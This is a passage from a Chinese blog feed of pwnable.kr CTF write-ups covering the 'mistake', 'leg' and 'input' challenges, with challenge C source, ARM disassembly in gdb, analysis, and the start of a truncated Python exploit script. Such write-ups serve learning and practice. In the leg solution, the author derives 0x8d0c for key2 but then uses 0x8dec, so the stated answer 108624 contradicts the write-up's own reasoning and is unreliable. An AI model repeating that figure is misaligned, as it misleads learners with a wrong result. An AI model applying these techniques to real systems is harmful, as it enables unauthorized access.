class="string">&quot;input password : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// xor your input</span></span><br><span class="line"><span class="keyword">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    这道题从直观上来看，就是首先读取同目录password的10个字节内容，然后我们输入10个字节数据并将其每个字节与0x1进行异或，最后对两个值比较，一致则得到flag。</p><p>​    但是从ssh链接信息来看，password和flag一样，当前账户没有读写权限，那么想要直接查看password内容就行不通了。</p><p>​    结合题目提示信息，对代码再次梳理后发现了问题所在，从第17行、27行，细心的人一看就能发现问题，27行对于len的赋值多加了个括号提高优先级。在C/C++中，关系运算符的优先级要高于赋值运算符，所以17行的<code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>这句代码，fd恒为0，而0作为文件描述符的一种，指向了stdin。相应的，27行read()读取的内容就是从stdin读取，而不是读取password内容。这也就是源码中使用<code>sleep(time(0)%20)</code>的原因，让我们以为程序执行起来后等待stdin键入内容的操作为程序睡眠操作，从而忽略这个关键点。</p><p>​    综上所述，只要控制stdin内容，那么两个要比较的buffer就都可以控制了，也就可以成功的cat flag了。验证一下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210908151725.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 从提示信息来看，本题和操作符优先级相关，具体信息如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210908095621.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;​    照例s</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之08-leg</title>
    <link href="http://example.com/2021/09/07/pwnable/pwnable.kr%E7%B3%BB%E5%88%9708-leg/"/>
    <id>http://example.com/2021/09/07/pwnable/pwnable.kr%E7%B3%BB%E5%88%9708-leg/</id>
    <published>2021-09-06T16:00:00.000Z</published>
    <updated>2021-09-12T12:56:53.982Z</updated>
    
    <content type="html"><![CDATA[<p>  题目描述如下，看起来是和arm汇编相关，提供了ssh链接以及对应文件的下载地址：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210831153234.png"></p><p>​    将对应文件下载，ssh链接上服务器，开始做题，其中leg.c和leg.asm内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov r3, pc\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;push    &#123;r6&#125;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;add    r6, pc, $1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;bx    r6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.code   16\n&quot;</span></span><br><span class="line">    <span class="string">&quot;mov    r3, pc\n&quot;</span></span><br><span class="line">    <span class="string">&quot;add    r3, $0x4\n&quot;</span></span><br><span class="line">    <span class="string">&quot;push    &#123;r3&#125;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop    &#123;pc&#125;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.code    32\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop    &#123;r6&#125;\n&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov r3, lr\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Daddy has very strong arm! : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line">    <span class="keyword">if</span>( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratz!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">        write(<span class="number">0</span>, buf, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I have strong leg :P\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008d3c &lt;+0&gt;:    push    &#123;r4, r11, lr&#125;</span><br><span class="line">   0x00008d40 &lt;+4&gt;:    add    r11, sp, #8</span><br><span class="line">   0x00008d44 &lt;+8&gt;:    sub    sp, sp, #12</span><br><span class="line">   0x00008d48 &lt;+12&gt;:    mov    r3, #0</span><br><span class="line">   0x00008d4c &lt;+16&gt;:    str    r3, [r11, #-16]</span><br><span class="line">   0x00008d50 &lt;+20&gt;:    ldr    r0, [pc, #104]    ; 0x8dc0 &lt;main+132&gt;</span><br><span class="line">   0x00008d54 &lt;+24&gt;:    bl    0xfb6c &lt;printf&gt;</span><br><span class="line">   0x00008d58 &lt;+28&gt;:    sub    r3, r11, #16</span><br><span class="line">   0x00008d5c &lt;+32&gt;:    ldr    r0, [pc, #96]    ; 0x8dc4 &lt;main+136&gt;</span><br><span class="line">   0x00008d60 &lt;+36&gt;:    mov    r1, r3</span><br><span class="line">   0x00008d64 &lt;+40&gt;:    bl    0xfbd8 &lt;__isoc99_scanf&gt;</span><br><span class="line">   0x00008d68 &lt;+44&gt;:    bl    0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:    mov    r4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:    bl    0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:    mov    r3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:    add    r4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:    bl    0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:    mov    r3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:    add    r2, r4, r3</span><br><span class="line">   0x00008d88 &lt;+76&gt;:    ldr    r3, [r11, #-16]</span><br><span class="line">   0x00008d8c &lt;+80&gt;:    cmp    r2, r3</span><br><span class="line">   0x00008d90 &lt;+84&gt;:    bne    0x8da8 &lt;main+108&gt;</span><br><span class="line">   0x00008d94 &lt;+88&gt;:    ldr    r0, [pc, #44]    ; 0x8dc8 &lt;main+140&gt;</span><br><span class="line">   0x00008d98 &lt;+92&gt;:    bl    0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008d9c &lt;+96&gt;:    ldr    r0, [pc, #40]    ; 0x8dcc &lt;main+144&gt;</span><br><span class="line">   0x00008da0 &lt;+100&gt;:    bl    0xf89c &lt;system&gt;</span><br><span class="line">   0x00008da4 &lt;+104&gt;:    b    0x8db0 &lt;main+116&gt;</span><br><span class="line">   0x00008da8 &lt;+108&gt;:    ldr    r0, [pc, #32]    ; 0x8dd0 &lt;main+148&gt;</span><br><span class="line">   0x00008dac &lt;+112&gt;:    bl    0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008db0 &lt;+116&gt;:    mov    r3, #0</span><br><span class="line">   0x00008db4 &lt;+120&gt;:    mov    r0, r3</span><br><span class="line">   0x00008db8 &lt;+124&gt;:    sub    sp, r11, #8</span><br><span class="line">   0x00008dbc &lt;+128&gt;:    pop    &#123;r4, r11, pc&#125;</span><br><span class="line">   0x00008dc0 &lt;+132&gt;:    andeq    r10, r6, r12, lsl #9</span><br><span class="line">   0x00008dc4 &lt;+136&gt;:    andeq    r10, r6, r12, lsr #9</span><br><span class="line">   0x00008dc8 &lt;+140&gt;:            ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0</span><br><span class="line">   0x00008dcc &lt;+144&gt;:            ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc</span><br><span class="line">   0x00008dd0 &lt;+148&gt;:    andeq    r10, r6, r4, asr #9</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:    mov    r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:    mov    r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:    push    &#123;r6&#125;        ; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:    add    r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:    bx    r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:    mov    r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:    adds    r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:    push    &#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:    pop    &#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:    pop    &#123;r6&#125;        ; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:    mov    r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:    mov    r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:    mov    r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    从源码可以看出，本题主要是和内联arm汇编相关，其中key1，key2，key3三个函数内容都是arm内联汇编的，成功cat flag的条件就是使得输入的key=key1()+key2()+key3()即可。</p><p>​    arm汇编和我们熟悉的x86体系汇编有很大不同，这道题考验了基础的arm汇编熟悉程度，leg.asm是已经反编译好的汇编代码。</p><p>​    这里挨个对key1，key2，key3进行分析，计算好r0中的返回值后加起来即可得到需要的buf。</p><ul><li>key1：先给r3赋值pc的值,此时地址为0x00008cdc，由于arm模式下是流水线作业，当执行到key1+0x8时pc值已经指向了下两条地址也就是pc值+0x8，所以执行完这条指令后，r3=0x00008ce4，然后将r3中值赋值给r0，r0存储返回值，所以key1()返回值为0x00008ce4</li><li>key2：从函数填充堆栈后，给r6赋值开始<ul><li>key2+0x8：r6中的值压入堆栈，后面用到r6这个寄存器</li><li>key2+0x12：给pc+0x1，用于后面bx跳转到Thumb模式下，r6=0x00008d05</li><li>key2+0x16：跳转指令，目标地址bit[0]=1，切换到Thumb状态</li><li>key2+0x20：Thumb模式下指令集为16bit，此时r3=0x00008d08</li><li>key2+0x22：r3=0x00008d0c，然后key2+0x32处将r3的值赋值给r0，所以key2()返回值为0x00008dec</li></ul></li><li>key3：main函数都是使用bl来调用key系列函数，即进入key3后，lr存储返回地址，也就是此时pc-0x4处的值，为0x00008d80，所以执行完毕后r0存储的返回值为0x00008d80</li></ul><p>综上，我们需要输入的值为0x00008ce4+0x00008dec+0x00008d80=0x1A850=108624即可</p><p>测试如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210907194202.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  题目描述如下，看起来是和arm汇编相关，提供了ssh链接以及对应文件的下载地址：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210831153234.png&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之07-input</title>
    <link href="http://example.com/2021/08/28/pwnable/pwnable.kr%E7%B3%BB%E5%88%9707-input/"/>
    <id>http://example.com/2021/08/28/pwnable/pwnable.kr%E7%B3%BB%E5%88%9707-input/</id>
    <published>2021-08-27T16:00:00.000Z</published>
    <updated>2021-09-12T12:56:47.273Z</updated>
    
    <content type="html"><![CDATA[<p>  看提示信息，该题也是一个和input相关的题目，信息如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812163245.png"></p><p>​    连上去看文件和权限，同时可以把源码和程序都到本地便于调试分析：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812163514.png"></p><p>​    input.c源码及反编译代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// argv</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// stdio</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// env</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// file</span></span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// network</span></span><br><span class="line">    <span class="keyword">int</span> sd, cd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line">    <span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    listen(sd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">    <span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// here&#x27;s your flag</span></span><br><span class="line">    system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    该题是一个综合的input题，有五关，达成五次验证即可成功cat flag，这里单纯使用python来完成题目，主要用到了subprocess模块及其中的Popen类，阅读一下subprocess.py的源码，可以知道Popen主要是用来构建一个子进程并为其设置如下一些启动选项，内部原理还是fork了一个子进程，而这些选项可以完美覆盖本题，所以选用更方便的python写exp：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210827164012.png"></p><ol><li><p>参数相关，输入100个参数，其中0x41和0x42个参数需要自己构造为对应的值</p></li><li><p>文件描述符相关，fd为0表示stdin，fd为2表示stderr，题目意思是先从stdin流中读取四个字节到buf，之后又从stderr流中读取四个字节到buf。可以通过创建子进程修改stdin和stderr的方式来完成绕过。</p></li><li><p>环境变量env相关，我们需要构造一个环境变量，来保证getenv()读取出来的是指定的字符串。分析到这里是已经知道可以通过参数env来传递需要设置的环境变量，但是第一次使用，不知道env对应的参数以什么格式传递。然后我去继续阅读了源码，发现Popen最终是通过os.execvpe()来传递对应的env进行子程序执行的，对os.exec系列函数进行查资料分析，发现这里环境变量对应的配置参数env必须是一个mapping对象，所以用dict即可(ps:使用过程中发现直接给env填写一个值，看报错信息也是一个方法。。。)。</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210827165722.png"></p></li><li><p>文件相关，读取指定的”\x0a”文件，且前四个字节为”\x00\x00\x00\x00”。这个我们自己造一个对应的文件填充内容即可。</p></li><li><p>网络相关，标准的套接字创建并接收流程。服务端绑定的端口通过argv[‘C’]传入，是可控的，我们只需要对localhost和对应的端口发起请求，send对应数据即可。</p></li></ol><p>最终构造的完整exp代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os,socket,time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="comment">#argv</span></span><br><span class="line">argv=<span class="built_in">list</span>(<span class="string">&#x27;A&#x27;</span>*<span class="number">100</span>)</span><br><span class="line">argv[<span class="number">0</span>]=<span class="string">&quot;./input&quot;</span></span><br><span class="line">argv[<span 